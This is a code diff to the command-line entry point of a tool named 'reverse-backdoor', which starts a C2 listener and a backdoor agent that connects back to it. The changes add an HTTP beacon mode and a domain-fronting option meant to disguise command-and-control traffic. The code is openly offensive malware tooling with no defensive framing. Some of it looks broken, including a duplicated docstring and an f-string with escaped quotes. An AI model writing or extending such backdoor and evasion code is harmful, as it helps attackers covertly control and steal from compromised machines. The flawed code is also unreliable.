@@ -36,7 +36,18 @@ def cli(ctx):
               help='Enable ECDH+AES-256-GCM encryption')
 @click.option('--tls/--no-tls', default=False,
               help='Enable TLS transport encryption')
-def server(host, port, loot, encryption, tls):
+@click.option('--http/--no-http', default=False, envvar='REVERSE_BACKDOOR_HTTP',
+              help='Use HTTP beacon instead of TCP')
+def server(host, port, loot, encryption, tls, http):
+    """Start the C2 listener and interactive manager."""
+    if http:
+        from server.server import _run_http
+        os.environ['REVERSE_BACKDOOR_BIND_HOST'] = host
+        os.environ['REVERSE_BACKDOOR_BIND_PORT'] = str(port)
+        os.environ['REVERSE_BACKDOOR_LOOT_DIR'] = loot
+        os.environ['REVERSE_BACKDOOR_TLS'] = str(tls).lower()
+        _run_http({'bind_host': host, 'bind_port': port, 'loot_dir': loot, 'tls': tls, 'http_mode': True})
+        return
     """Start the C2 listener and interactive manager."""
     click.secho('[+] Starting reverse-backdoor C2 server', fg='green', bold=True)
     click.secho(f'    Bind: {host}:{port}', fg='cyan')
@@ -72,7 +83,11 @@ def server(host, port, loot, encryption, tls):
               help='Enable ECDH+AES-256-GCM encryption')
 @click.option('--tls/--no-tls', default=False,
               help='Enable TLS transport encryption')
-def client(host, port, reconnect, encryption, tls):
+@click.option('--http/--no-http', default=False, envvar='REVERSE_BACKDOOR_HTTP',
+              help='Use HTTP beacon mode')
+@click.option('--front-host', default=None,
+              help='Domain fronting host header (e.g. cdn.cloudfront.net)')
+def client(host, port, reconnect, encryption, tls, http, front_host):
     """Start the agent (backdoor) — connects to C2 server."""
     from client.core.connection import connect_and_run
     from client.core.dispatcher import handle_session
@@ -80,18 +95,22 @@ def client(host, port, reconnect, encryption, tls):
 
     platform = get_platform()
 
-    def shell_callback(sock, enc, tl):
-        handle_session(sock, platform, enc, tl)
+    if http:
+        def shell_callback(proto, enc, tl, hm):
+            handle_session(proto, platform, enc, tl, True, hm)
+    else:
+        def shell_callback(sock, enc, tl, hm):
+            handle_session(sock, platform, enc, tl, True, hm)
 
     click.secho('[+] Agent connecting...', fg='yellow')
     click.secho(f'    Target: {host}:{port}', fg='cyan')
-    enc_status = "ON" if encryption else "OFF"
-    tls_status = "ON" if tls else "OFF"
-    click.secho(f'    Encryption: {enc_status}', fg='cyan')
-    click.secho(f'    TLS: {tls_status}', fg='cyan')
+    click.secho(f'    HTTP: {\"ON\" if http else \"OFF\"}', fg='cyan')
+    if front_host:
+        click.secho(f'    Front host: {front_host}', fg='cyan')
 
     try:
-        connect_and_run(host, port, shell_callback, reconnect, encryption, tls)
+        connect_and_run(host, port, shell_callback, reconnect,
+                        encryption, tls, http, front_host)
     except KeyboardInterrupt:
         click.secho('\n[-] Agent stopped', fg='red')
 
